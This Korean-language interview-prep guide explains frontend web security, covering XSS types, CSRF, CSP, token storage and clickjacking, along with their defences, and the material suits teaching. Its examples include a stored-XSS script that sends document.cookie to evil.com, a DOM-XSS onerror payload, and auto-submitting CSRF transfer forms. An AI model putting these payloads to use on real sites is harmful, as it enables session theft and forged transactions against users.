## D1. 프론트엔드 개발자가 왜 보안을 신경 써야 하나요? 🔴

**💬 30초 답변**
> 프론트엔드는 사용자의 입력과 브라우저에서 실제로 실행되는 코드를 다루기 때문에, 공격의 **1차 접점**입니다. 특히 **XSS**(내 페이지에서 남의 스크립트가 실행됨)와 **CSRF**(사용자 몰래 요청이 전송됨)는 프론트 코드와 직결됩니다. "서버가 막아주겠지"는 위험한 생각이고, 보안은 서버·클라이언트가 **다층 방어(defense in depth)** 로 함께 책임집니다. 핵심 원칙은 하나입니다 — **"사용자 입력은 절대 믿지 않는다."**

**📖 핵심 개념**

🎯 **비유**: 웹 앱은 은행 창구입니다. 서버는 금고, 브라우저는 창구 직원입니다. 아무리 금고(서버)가 튼튼해도 창구 직원(프론트)이 위조 신분증을 그대로 통과시키면 뚫립니다. 프론트 보안은 "창구에서 걸러야 할 것을 거르는 일"입니다.

📌 **프론트엔드가 마주하는 대표 위협 3가지**

| 위협 | 한 줄 정의 | 누가 피해를 보나 |
|------|-----------|-----------------|
| **XSS** | 공격자의 JS가 **피해자 브라우저**에서 실행됨 | 사이트 사용자 |
| **CSRF** | 로그인된 사용자를 이용해 **의도치 않은 요청** 전송 | 로그인 사용자 |
| **클릭재킹** | 투명 iframe으로 클릭을 가로챔 | 사이트 사용자 |

📌 **관통하는 원칙**

- **입력 검증(validation)**: 들어오는 데이터가 기대한 형식인가? (예: 이메일 형식)
- **출력 인코딩(escaping)**: 화면·쿼리에 데이터를 넣을 때 그 **맥락(context)에 맞게** 무해화한다. — XSS 방어의 핵심.
- **최소 권한**: 토큰·쿠키에 꼭 필요한 권한만.
- **다층 방어**: 한 겹이 뚫려도 다음 겹이 막는다 (예: 입력 검증 + 이스케이프 + CSP).

**🔥 예상 꼬리질문**
- Q. 서버에서 검증하면 프론트 검증은 필요 없지 않나요? → A. 프론트 검증은 **UX(즉각 피드백)** 목적이고, 보안 관점에선 **서버 검증이 필수**입니다. 공격자는 프론트를 우회해 API를 직접 때릴 수 있으니까요. 둘 다 필요하되 "신뢰의 최종 책임"은 서버에 있습니다.
- Q. HTTPS만 쓰면 안전한가요? → A. 아닙니다. HTTPS는 **전송 구간 도청·변조(중간자 공격)** 를 막아줄 뿐, XSS·CSRF는 HTTPS로 막을 수 없습니다. HTTPS는 필수 기반이지만 애플리케이션 레벨 방어는 별개입니다.

<details><summary>📝 한 줄 요약</summary>프론트는 공격의 1차 접점. 원칙은 "사용자 입력은 믿지 않는다" + 다층 방어. 대표 위협은 XSS·CSRF·클릭재킹.</details>

## D2. XSS가 뭔가요? 3가지 유형을 설명해 주세요 🔴

**💬 30초 답변**
> **XSS(Cross-Site Scripting)** 는 공격자가 삽입한 악성 스크립트가 **다른 사용자의 브라우저**에서 내 사이트 권한으로 실행되는 공격입니다. 실행되면 쿠키·토큰 탈취, 세션 하이재킹, 피싱 폼 삽입, 키로깅 등이 가능합니다. 저장 위치와 실행 경로에 따라 **Stored(저장형)**, **Reflected(반사형)**, **DOM 기반** 3가지로 나뉩니다.

**📖 핵심 개념**

🎯 **비유**: 게시판에 누가 "댓글"인 척 폭탄을 심어놨는데, 다른 사람이 그 게시글을 **열어보는 순간** 폭탄이 그 사람 손 안에서 터지는 것입니다. 폭탄은 공격자 것이지만, 터지는 곳은 피해자의 브라우저이고, 내 사이트의 신뢰(도메인·쿠키) 아래서 터집니다.

📌 **3가지 유형**

| 유형 | 악성 스크립트가 어디에 | 트리거 |
|------|----------------------|--------|
| **Stored (저장형)** | 서버 DB에 저장됨 (게시글·댓글·프로필) | 다른 사용자가 그 콘텐츠를 볼 때마다 | 
| **Reflected (반사형)** | URL 파라미터 등 요청에 담김 → 응답에 그대로 반사 | 피해자가 조작된 링크를 클릭할 때 |
| **DOM 기반** | 서버를 거치지 않고 **클라이언트 JS**가 직접 DOM에 삽입 | 취약한 JS가 `location.hash` 등을 innerHTML에 넣을 때 |

```html
<!-- Stored XSS 예: 댓글에 이걸 저장하면 -->
<script>
  fetch('https://evil.com/steal?c=' + document.cookie)
</script>
<!-- 다른 사용자가 댓글을 볼 때마다 그들의 쿠키가 공격자 서버로 전송됨 -->
```

```js
// DOM 기반 XSS 예 (서버는 무죄, 프론트 JS가 취약)
// URL: https://mysite.com/#<img src=x onerror=alert(document.cookie)>
const q = decodeURIComponent(location.hash.slice(1));
document.getElementById('out').innerHTML = q; // ❌ innerHTML로 삽입 → 실행됨
```

📌 **왜 위험한가**: 스크립트가 **내 도메인 컨텍스트**에서 돌기 때문에 `document.cookie`(HttpOnly가 아니면), `localStorage`, 진행 중인 세션에 모두 접근 가능합니다. 사실상 "그 사용자로 로그인한 것과 같은" 권한을 얻습니다.

> 💡 **면접 포인트**: "DOM 기반 XSS는 서버 응답이 완전히 정상이어도 발생한다"는 점을 말하면 이해도가 높아 보입니다. 서버 로그로는 잡히지 않고, 순전히 클라이언트 코드의 문제입니다.

**🔥 예상 꼬리질문**
- Q. Stored와 Reflected 중 뭐가 더 위험한가요? → A. 일반적으로 **Stored**가 더 위험합니다. 링크 클릭 유도 없이 콘텐츠를 보는 **모든 사용자**에게 자동으로 퍼지기 때문입니다(worm처럼 확산 가능). Reflected는 피해자가 조작된 링크를 눌러야 합니다.
- Q. `<script>` 태그만 막으면 되나요? → A. 아닙니다. `onerror`, `onload` 같은 이벤트 핸들러 속성, `javascript:` URL, `<img src=x onerror=...>`, SVG 등 실행 경로가 아주 많습니다. 그래서 "블랙리스트로 특정 태그 차단"이 아니라 "**맥락에 맞는 출력 인코딩**"이 정답입니다.
- Q. `document.cookie`를 못 읽게 하려면? → A. 쿠키에 `HttpOnly` 플래그를 주면 JS가 접근 못 합니다(D7). 단 이건 쿠키 탈취를 막을 뿐 XSS 자체(요청 위조 등)를 막진 않습니다.

<details><summary>📝 한 줄 요약</summary>XSS = 공격자 스크립트가 피해자 브라우저에서 내 도메인 권한으로 실행. Stored(DB)·Reflected(URL 반사)·DOM 기반(클라 JS). Stored가 확산성 때문에 특히 위험.</details>

## D3. XSS는 어떻게 막나요? 🔴

**💬 30초 답변**
> 핵심은 **"데이터를 코드로 해석되지 않게 하는 것"** 입니다. ①사용자 입력을 화면에 넣을 때 **맥락에 맞는 출력 인코딩(이스케이프)**, ②React 같은 프레임워크의 **자동 이스케이프**를 신뢰하고 `dangerouslySetInnerHTML`을 피하기, ③HTML을 꼭 렌더해야 하면 **DOMPurify로 새니타이즈**, ④방어선 추가로 **CSP**와 **HttpOnly 쿠키**를 겁니다. 블랙리스트 필터링은 우회가 쉬워서 신뢰하지 않습니다.

**📖 핵심 개념**

📌 **1) 출력 인코딩 (가장 근본적인 방어)**

같은 문자열도 넣는 위치(context)에 따라 인코딩 방식이 다릅니다.

| 맥락 | 위험 예 | 처리 |
|------|--------|------|
| HTML 본문 | `<div>여기</div>` | `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;` |
| HTML 속성 | `<img alt="여기">` | 따옴표·`&` 이스케이프, 값은 반드시 따옴표로 감싸기 |
| JS 문자열 | `var x = "여기"` | JS 이스케이프 (또는 아예 데이터를 JSON으로) |
| URL | `?q=여기` | `encodeURIComponent` |

📌 **2) React/프레임워크의 자동 이스케이프**

React는 JSX `{}` 안의 값을 **자동으로 이스케이프**합니다. 그래서 아래는 안전합니다.

```jsx
// ✅ 안전: userInput이 "<script>..."여도 텍스트로 렌더됨
function Comment({ userInput }) {
  return <div>{userInput}</div>;
}

// ❌ 위험: dangerouslySetInnerHTML은 이스케이프를 끈다
function Bad({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

📌 **3) HTML을 꼭 렌더해야 할 때 → DOMPurify로 새니타이즈**

리치 텍스트 에디터 결과처럼 HTML을 살려야 한다면, 직접 필터링하지 말고 검증된 라이브러리를 씁니다.

```jsx
import DOMPurify from 'dompurify';

function RichText({ html }) {
  const clean = DOMPurify.sanitize(html); // 스크립트·이벤트 핸들러 제거
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

📌 **4) Trusted Types (🟢 심화, 최신 방어)**

Chromium 계열이 지원하는 브라우저 기능으로, `innerHTML` 같은 위험한 sink에 **문자열을 바로 넣지 못하게** 강제합니다. CSP 헤더 `require-trusted-types-for 'script'`로 켜면, 반드시 정책을 거친 `TrustedHTML`만 허용되어 DOM 기반 XSS를 구조적으로 차단합니다.

📌 **5) 절대 하지 말 것 / 주의**

- `eval()`, `new Function(userInput)`, `setTimeout("문자열")` 금지.
- `element.innerHTML = 사용자입력` 대신 `textContent` 사용.
- `href={userInput}`에서 `javascript:` 스킴 주의 (URL 검증).

🎯 **비유**: 이스케이프는 "위험물을 밀봉해서 보여주기 전용으로 만드는 것"입니다. 폭탄을 유리 진열장(텍스트)에 넣으면 볼 수는 있어도 터지지(실행되지) 않습니다.

> 💡 **면접 포인트**: "React를 쓰면 XSS가 자동으로 막히지만, `dangerouslySetInnerHTML`·`href`에 넣는 URL·SSR 시 `<script>`에 주입하는 초기 데이터 등 **자동 이스케이프가 안 통하는 구멍**이 있다"까지 말하면 실무 이해도가 드러납니다.

**🔥 예상 꼬리질문**
- Q. 입력을 저장할 때 이스케이프할까요, 출력할 때 할까요? → A. **출력 시점(렌더링 맥락을 알 때)** 이 원칙입니다. 저장 시 이스케이프하면 맥락(HTML/URL/JS)마다 다른데 하나로 뭉뚱그려져 오히려 깨지거나 이중 이스케이프 문제가 생깁니다. 데이터는 원본으로 저장하고 쓰는 곳에서 그 맥락에 맞게 인코딩합니다.
- Q. CSP만으로 XSS를 막을 수 있나요? → A. CSP는 **완화(mitigation) 계층**이지 근본 방어가 아닙니다. 인라인 스크립트·외부 스크립트를 제한해 공격 성공률을 크게 낮추지만, 출력 인코딩이 1차 방어이고 CSP는 "그래도 뚫렸을 때의 안전망"입니다.
- Q. React에서 `dangerouslySetInnerHTML`을 꼭 써야 하면? → A. 반드시 DOMPurify 같은 새니타이저를 통과시키고, 가능하면 허용 태그를 화이트리스트로 좁힙니다.

<details><summary>📝 한 줄 요약</summary>XSS 방어의 근본은 맥락별 출력 인코딩. React `{}`는 자동 이스케이프, `dangerouslySetInnerHTML`은 DOMPurify와 함께. 추가 방어선으로 CSP·HttpOnly·Trusted Types.</details>

## D4. CSRF가 뭔가요? 어떻게 공격이 이루어지나요? 🔴

**💬 30초 답변**
> **CSRF(Cross-Site Request Forgery, 사이트 간 요청 위조)** 는 로그인된 사용자가 악성 사이트를 방문했을 때, 그 사이트가 사용자 몰래 **내 서비스로 요청을 보내는** 공격입니다. 브라우저가 요청에 **쿠키를 자동으로 붙이는** 성질을 악용합니다. 핵심 차이는 XSS가 "스크립트 실행"이라면, CSRF는 "사용자의 인증 상태를 빌려 원치 않는 **행위**(송금·비밀번호 변경 등)를 시키는 것"입니다.

**📖 핵심 개념**

🎯 **비유**: 은행에 로그인된(도장이 찍힌) 상태에서, 사기꾼이 "이 종이에 서명만 해주세요"라며 슬쩍 송금 신청서를 내밀고, 은행은 도장(쿠키)이 맞으니 처리해버리는 상황입니다. 사용자는 자기가 무슨 요청을 보냈는지도 모릅니다.

📌 **공격 시나리오 (단계별)**

1. 피해자가 `bank.com`에 로그인 → 브라우저에 세션 쿠키 저장.
2. 피해자가 로그아웃하지 않은 채 공격자의 사이트 `evil.com` 방문.
3. `evil.com`에 아래 같은 요소가 숨어 있음:

```html
<!-- 이미지인 척, 페이지 로드 시 자동으로 GET 요청 발사 -->
<img src="https://bank.com/transfer?to=attacker&amount=1000000" />

<!-- 또는 자동 제출되는 폼으로 POST -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000000" />
</form>
<script>document.getElementById('f').submit();</script>
```

4. 브라우저는 `bank.com`으로 가는 요청에 **세션 쿠키를 자동 첨부** → 서버는 정상 사용자 요청으로 착각하고 송금 처리.

📌 **CSRF가 성립하는 조건**

- 인증이 **쿠키처럼 자동 전송되는 수단**에 의존한다. (그래서 `Authorization: Bearer` 헤더 방식은 CSRF에 상대적으로 강함 — 헤더는 자동으로 안 붙으니까.)
- 요청이 **예측 가능**하고, 서버가 요청의 **출처(origin)** 를 검증하지 않는다.

> 💡 **면접 포인트**: "CSRF는 응답을 훔쳐볼 필요가 없다"는 게 포인트입니다. 공격자는 응답을 못 봐도(SOP·CORS가 막음) **요청이 실행되기만 하면** 목적(송금 등 상태 변경)을 달성합니다. 그래서 GET으로 상태를 바꾸는 API 설계가 특히 위험합니다.

**🔥 예상 꼬리질문**
- Q. XSS와 CSRF의 차이를 한 문장으로? → A. XSS는 "**사이트가 사용자를 신뢰**해서 생기는 문제(악성 스크립트 실행)", CSRF는 "**서버가 브라우저(쿠키)를 신뢰**해서 생기는 문제(위조 요청 실행)"입니다.
- Q. XSS가 있으면 CSRF 방어가 소용없다는데? → A. 맞습니다. XSS로 스크립트를 실행할 수 있으면 CSRF 토큰을 읽어서 함께 보낼 수 있으니 CSRF 방어가 무력화됩니다. 그래서 **XSS 방어가 더 근본적**이라고 봅니다.
- Q. REST API + 토큰(JWT) 방식도 CSRF에 취약한가요? → A. 토큰을 **쿠키에 저장하고 자동 전송**하면 여전히 취약합니다. `Authorization` 헤더에 담아 **JS가 명시적으로 붙이는** 방식이면 CSRF에 강하지만, 그 대가로 XSS로 토큰이 탈취될 위험이 생깁니다(트레이드오프, D7).

<details><summary>📝 한 줄 요약</summary>CSRF = 로그인 사용자의 쿠키 자동 전송을 악용해 몰래 요청을 위조. 응답을 훔칠 필요 없이 "요청 실행"만으로 성립. XSS와 달리 "서버가 쿠키를 신뢰"해서 생김.</details>

## D5. CSRF는 어떻게 막나요? 🔴

**💬 30초 답변**
> 핵심은 "이 요청이 **정말 우리 사이트에서 시작됐는가**"를 검증하는 것입니다. 대표 방어는 ①**CSRF 토큰**(서버가 발급한 예측 불가 토큰을 요청에 함께 보내 검증), ②**SameSite 쿠키**(크로스 사이트 요청에 쿠키를 안 붙임 — 최신 브라우저 기본값 `Lax`), ③서버의 **Origin/Referer 검증**입니다. 실무에선 SameSite + CSRF 토큰을 **함께** 씁니다(다층 방어).

**📖 핵심 개념**

📌 **1) SameSite 쿠키 (요즘 1차 방어)**

쿠키가 **크로스 사이트 요청**에 붙을지를 제어합니다.

| 값 | 동작 | 비고 |
|----|------|------|
| `Strict` | 크로스 사이트면 **절대** 안 붙음 | 가장 안전하나, 외부 링크로 들어오면 로그인 풀린 것처럼 보임 |
| `Lax` | 크로스 사이트 **GET(최상위 내비게이션)** 만 허용, POST 등은 차단 | **현대 브라우저 기본값**, 실용적 균형 |
| `None` | 항상 붙음 | 반드시 `Secure`(HTTPS) 동반 필요. 서드파티 쿠키 용도 |

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
```

> `SameSite=Lax`가 기본이 되면서 폼 POST 기반 전형적 CSRF는 상당 부분 자동 완화됐습니다. 하지만 "기본값에만 의존하지 말라"가 정석 — 명시적으로 설정하고 토큰도 병행합니다.

📌 **2) CSRF 토큰 (Synchronizer Token 패턴)**

서버가 세션마다 **예측 불가능한 토큰**을 발급 → 폼/요청에 실어 보내게 하고 → 서버가 세션의 토큰과 대조합니다. 공격자는 이 토큰 값을 알 수 없어(SOP로 읽지 못함) 위조가 불가능합니다.

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="a1b2c3d4-random-per-session" />
  ...
</form>
```

📌 **3) Double Submit Cookie (🟡)**

서버 세션 저장 없이, 랜덤 값을 **쿠키와 요청 헤더 양쪽**에 넣고 서버가 둘이 일치하는지 확인합니다. 헤더는 JS가 붙여야 하고 크로스 사이트에서는 다른 오리진의 쿠키를 읽어 헤더에 넣지 못하므로 위조가 어렵습니다. SPA + REST에서 흔히 씁니다.

```js
// 프론트: 쿠키의 CSRF 값을 읽어 헤더로 함께 전송
axios.defaults.headers.common['X-CSRF-Token'] = getCookie('csrfToken');
```

📌 **4) 커스텀 헤더 요구 (🟡)**

`X-Requested-With` 같은 커스텀 헤더는 크로스 오리진에서 **단순 요청으로 붙일 수 없어**(CORS preflight 유발) CSRF 방어에 활용됩니다.

🎯 **비유**: CSRF 토큰은 "매번 바뀌는 일회용 비밀 암구호"입니다. 도장(쿠키)만으론 부족하고, 진짜 우리 창구에서 받은 사람만 아는 암구호까지 대야 처리해줍니다. 공격자는 암구호를 훔쳐볼 수 없습니다.

> 💡 **면접 포인트**: "GET은 조회, 상태 변경은 POST/PUT/DELETE로" 같은 **REST 원칙 준수 자체가 방어**라는 점을 덧붙이면 좋습니다. GET으로 부수효과(송금 등)를 만들지 않으면 `<img src>` 류 공격 표면이 줄어듭니다.

**🔥 예상 꼬리질문**
- Q. SameSite=Lax가 기본인데 CSRF 토큰이 아직 필요한가요? → A. 필요합니다. ①구형 브라우저, ②`SameSite=None`을 써야 하는 서비스, ③서브도메인/동일 사이트 내부 공격 등 예외가 있어 **다층 방어**로 토큰을 병행합니다.
- Q. CORS가 CSRF를 막아주지 않나요? → A. 아닙니다. CORS는 "응답을 **읽는** 것"을 통제할 뿐 "요청이 **전송·실행**되는 것"은 막지 못합니다. CSRF는 응답을 안 읽어도 성립하므로 CORS로는 못 막습니다(흔한 오해).
- Q. JWT를 쿠키에 담으면 CSRF 대책은? → A. `SameSite` 설정 + CSRF 토큰(또는 Double Submit)을 겁니다. 헤더 방식으로 바꾸면 CSRF는 사라지지만 XSS 노출을 관리해야 합니다.

<details><summary>📝 한 줄 요약</summary>CSRF 방어 = 요청 출처 검증. SameSite 쿠키(기본 Lax) + CSRF 토큰(예측 불가 값 대조)을 함께. CORS는 CSRF를 못 막는다. 상태 변경은 반드시 비-GET.</details>

## D6. CSP(Content-Security-Policy)가 뭔가요? 🟡

**💬 30초 답변**
> **CSP** 는 브라우저에게 "이 페이지에서 **어떤 출처의 리소스**(스크립트·스타일·이미지 등)만 허용할지"를 알려주는 HTTP 응답 헤더입니다. 특히 인라인 스크립트와 허가되지 않은 외부 스크립트 실행을 차단해 **XSS의 피해를 크게 줄이는 안전망**입니다. 근본 방어(이스케이프)를 대체하진 않지만, 뚫렸을 때의 2차 방어선으로 매우 강력합니다.

**📖 핵심 개념**

🎯 **비유**: CSP는 클럽 입구의 **게스트 명단**입니다. "명단(허용 출처)에 없는 스크립트는 아무리 그럴듯해도 입장(실행) 불가." XSS로 몰래 스크립트를 넣어도 명단에 없으면 브라우저가 실행을 거부합니다.

📌 **기본 예시**

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://apis.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  object-src 'none';
  base-uri 'self';
```

- `default-src 'self'`: 기본적으로 **같은 출처**만 허용.
- `script-src 'self' ...`: JS는 자기 도메인과 명시된 CDN에서만.
- `object-src 'none'`: `<object>`/플러그인 차단.

📌 **인라인 스크립트를 안전하게 허용: nonce / hash (🟢)**

`'unsafe-inline'`은 XSS 방어를 무력화하므로 지양하고, 대신:

- **nonce**: 요청마다 랜덤 값을 발급해 `<script nonce="xyz">`와 헤더에 함께 넣어 매칭.
- **hash**: 특정 인라인 스크립트의 해시(`sha256-...`)를 허용 목록에.
- **`strict-dynamic`**: nonce로 신뢰한 스크립트가 로드하는 하위 스크립트도 신뢰(호스트 화이트리스트 관리 부담을 줄이는 현대적 접근).

```
Content-Security-Policy:
  script-src 'nonce-r4nd0m' 'strict-dynamic';
```

```html
<script nonce="r4nd0m">/* 이 인라인만 실행 허용 */</script>
```

📌 **보고 전용 모드**: 처음부터 강하게 걸면 사이트가 깨지므로, `Content-Security-Policy-Report-Only` + `report-to`로 **차단 없이 위반만 수집**하며 점진 도입합니다.

> 💡 **면접 포인트**: "CSP는 XSS의 **근본 해결이 아니라 완화**"라고 정확히 구분하는 것, 그리고 "`unsafe-inline`을 피하고 nonce/hash를 쓴다"는 실무 감각을 보이면 좋습니다.

**🔥 예상 꼬리질문**
- Q. CSP를 켰는데 인라인 스크립트가 안 돌아요. → A. `script-src`에 `'unsafe-inline'`이 없으면 인라인이 차단됩니다. 정답은 인라인을 외부 파일로 빼거나 nonce/hash를 부여하는 것입니다.
- Q. CSP 헤더는 어디서 설정하나요? → A. 서버/프록시(Nginx), 또는 Next.js `next.config`·미들웨어, 메타 태그(`<meta http-equiv>`)로도 일부 가능합니다. 헤더 방식이 권장됩니다.
- Q. `frame-ancestors`는 뭔가요? → A. 내 페이지를 어떤 사이트가 iframe으로 감쌀 수 있는지 제어 → **클릭재킹 방어**(X-Frame-Options의 현대적 대체, D8).

<details><summary>📝 한 줄 요약</summary>CSP = "허용된 출처의 리소스만 실행"을 브라우저에 지시하는 헤더. XSS 완화 안전망. `unsafe-inline` 대신 nonce/hash/strict-dynamic. Report-Only로 점진 도입.</details>

## D7. 토큰이나 세션은 어디에 저장하는 게 안전한가요? 🔴

**💬 30초 답변**
> 정답은 트레이드오프입니다. **httpOnly 쿠키**에 저장하면 JS가 접근 못 해 **XSS로 탈취되지 않지만** CSRF 대책이 필요합니다. **localStorage**에 저장하면 CSRF엔 안전하지만 **XSS 한 방에 토큰이 통째로 털립니다**. 그래서 일반적으로 민감한 인증 토큰은 **`HttpOnly; Secure; SameSite` 쿠키**에 두고 CSRF 방어를 병행하는 쪽을 더 안전하게 봅니다.

**📖 핵심 개념**

📌 **쿠키 보안 플래그 3종 (필수 암기)**

| 플래그 | 역할 |
|--------|------|
| `HttpOnly` | JS(`document.cookie`)에서 접근 불가 → **XSS로 탈취 방지** |
| `Secure` | HTTPS 연결에서만 전송 → 평문 도청 방지 |
| `SameSite` | 크로스 사이트 전송 제어 → **CSRF 완화**(D5) |

```
Set-Cookie: token=...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
```

📌 **저장 위치 비교**

| 저장소 | XSS에 안전? | CSRF에 안전? | 비고 |
|--------|:---:|:---:|------|
| `HttpOnly` 쿠키 | ✅ (JS 접근 불가) | ❌ (자동 전송) → 토큰·SameSite 필요 | 인증 토큰 권장 |
| `localStorage` | ❌ (JS가 읽음) | ✅ (자동 전송 안 됨) | XSS 시 전량 유출 |
| `sessionStorage` | ❌ | ✅ | 탭 닫으면 사라짐 |
| 메모리(변수) | 비교적 안전(새로고침 시 소실) | ✅ | 리프레시 토큰과 조합 |

🎯 **비유**: `HttpOnly` 쿠키는 "직원이 직접 만질 수 없는 금고 안 열쇠"입니다. 강도(XSS)가 사무실에 들어와도 열쇠를 손에 쥘 수 없습니다. 대신 금고가 자동으로 열리는 조건(쿠키 자동 전송=CSRF)을 별도로 잠가야 합니다.

📌 **실무 패턴 (🟢)**: 액세스 토큰은 **메모리**에 짧게, 리프레시 토큰은 **`HttpOnly` 쿠키**에 두는 하이브리드가 널리 쓰입니다. XSS로 메모리 토큰이 잠깐 노출돼도 수명이 짧고, 장기 자격증명(리프레시)은 JS가 못 건드립니다.

> 💡 **면접 포인트**: "localStorage에 JWT 저장이 편하지만 XSS에 취약하다"는 점, "완벽한 저장소는 없고 위협 모델에 따라 고른다"는 균형 잡힌 시각을 보이는 게 핵심입니다. 단정적으로 "무조건 X가 정답"이라고 말하지 않습니다.

**🔥 예상 꼬리질문**
- Q. 그럼 JWT는 무조건 쿠키에 넣어야 하나요? → A. 상황에 따라 다릅니다. 서드파티에서 API를 호출해야 하면 헤더+저장소 방식이 편하고, 같은 사이트 위주면 HttpOnly 쿠키가 안전합니다. 어느 쪽이든 **XSS 방어가 전제**입니다(XSS가 뚫리면 둘 다 위험).
- Q. HttpOnly면 XSS가 나도 완전 안전한가요? → A. 토큰 **탈취**는 막지만, XSS 스크립트가 사용자 브라우저에서 인증된 상태로 **직접 요청을 보내는 것**은 막지 못합니다(쿠키는 자동 첨부되니까). 그래서 XSS 방어 자체가 필수입니다.
- Q. `Domain` 속성을 넓게 주면? → A. 서브도메인까지 쿠키가 공유돼 공격 표면이 커집니다. 필요한 범위로 좁히는 게 최소 권한 원칙에 맞습니다.

<details><summary>📝 한 줄 요약</summary>쿠키 플래그 HttpOnly(XSS 방지)·Secure(HTTPS)·SameSite(CSRF 완화). localStorage는 XSS에 취약, HttpOnly 쿠키는 CSRF 대책 필요. 완벽한 저장소는 없고 위협 모델로 선택.</details>

## D8. 그 외 알아두면 좋은 프론트엔드 보안 위협은요? 🟡

**💬 30초 답변**
> XSS·CSRF 외에도 **클릭재킹**(투명 iframe으로 클릭 탈취), **오픈 리다이렉트**(리다이렉트 URL 조작으로 피싱), **의존성 취약점**(npm 패키지의 알려진 CVE), **민감정보 노출**(번들·환경변수에 API 키 하드코딩), 그리고 **CORS에 대한 흔한 오해**를 알아두면 좋습니다.

**📖 핵심 개념**

📌 **클릭재킹(Clickjacking)**: 내 사이트를 투명한 iframe으로 덮어 사용자가 다른 버튼을 누르는 줄 알고 위험한 동작을 클릭하게 만드는 공격. 방어는 응답 헤더:

```
Content-Security-Policy: frame-ancestors 'none';   # 현대적 방식
X-Frame-Options: DENY                                # 구형 호환
```

📌 **오픈 리다이렉트**: `/login?redirect=https://evil.com` 처럼 리다이렉트 대상을 검증 없이 따라가면 피싱에 악용됩니다. → 리다이렉트 대상을 **화이트리스트/상대경로**로 제한.

📌 **의존성 취약점**: `npm audit`, Dependabot 등으로 알려진 취약점을 점검·업데이트. 프론트 번들에 포함되는 서드파티 라이브러리도 공격 표면입니다.

📌 **민감정보 노출**: 클라이언트 번들은 **누구나 열어볼 수 있습니다.** API 시크릿·비공개 키를 프론트 코드나 `NEXT_PUBLIC_` 환경변수에 넣지 말 것. 비밀은 서버(서버리스 함수/BFF)에서만 다룹니다.

📌 **CORS에 대한 오해 (자주 나옴)**: CORS는 "**브라우저가 크로스 오리진 응답을 JS로 읽는 것**"을 통제하는 브라우저 정책이지, **서버 보안 장치가 아닙니다.** CORS를 열어줘도 인증·인가는 별도로 해야 하고, CORS를 막아도 요청 자체(서버 도달)는 막지 못합니다(CSRF 참고).

🎯 **비유**: 클릭재킹은 "함정 문 위에 예쁜 카펫을 깔아두는 것", 오픈 리다이렉트는 "우리 로비를 통과시켜주는 척하며 뒷문으로 낯선 건물에 보내는 것"입니다.

> 💡 **면접 포인트**: "SOP(Same-Origin Policy)와 CORS의 관계"를 정확히: SOP가 기본적으로 크로스 오리진 접근을 **차단**하고, CORS는 서버가 **명시적으로 예외를 허용**하는 메커니즘입니다.

**🔥 예상 꼬리질문**
- Q. `X-Frame-Options`와 CSP `frame-ancestors` 중 뭘 쓰나요? → A. `frame-ancestors`가 최신·유연(여러 출처 허용 가능)해 권장되며, 구형 브라우저 호환을 위해 둘 다 두기도 합니다.
- Q. 프론트에 API 키를 꼭 써야 하면? → A. 공개돼도 되는 키(예: 도메인 제한된 지도 키)만 두고, 비밀 키는 서버 프록시를 거칩니다. 키에 사용량·도메인·스코프 제한을 겁니다.
- Q. Subresource Integrity(SRI)는? → A. CDN 스크립트에 `integrity="sha384-..."`를 걸어 파일이 변조되면 로드를 거부 → 공급망 변조 방어(🟢).

## 🎯 이 문서 한 장 정리 (면접 직전 훑기)

- **XSS**: 공격자 스크립트가 피해자 브라우저에서 내 도메인 권한으로 실행. Stored/Reflected/DOM. 방어 = **맥락별 출력 인코딩**(1차) + React 자동 이스케이프 + DOMPurify + CSP·HttpOnly(안전망).
- **CSRF**: 로그인 사용자의 **쿠키 자동 전송**을 악용한 요청 위조. 방어 = **SameSite 쿠키(기본 Lax) + CSRF 토큰**. CORS는 CSRF를 못 막는다.
- **CSP**: 허용 출처만 실행시키는 헤더. XSS **완화 안전망**. `unsafe-inline` 대신 **nonce/hash/strict-dynamic**.
- **쿠키 플래그**: `HttpOnly`(XSS 방지)·`Secure`(HTTPS)·`SameSite`(CSRF 완화). localStorage 토큰은 XSS에 취약.
- **관통 원칙**: 사용자 입력을 믿지 말고, 서버가 최종 검증하며, 여러 겹으로 방어한다.
- **자주 나오는 함정**: ①CORS는 서버 보안이 아니다 ②HTTPS만으론 XSS/CSRF 못 막는다 ③XSS가 뚫리면 CSRF 방어·HttpOnly도 사실상 무력 → **XSS 방어가 가장 근본적**.
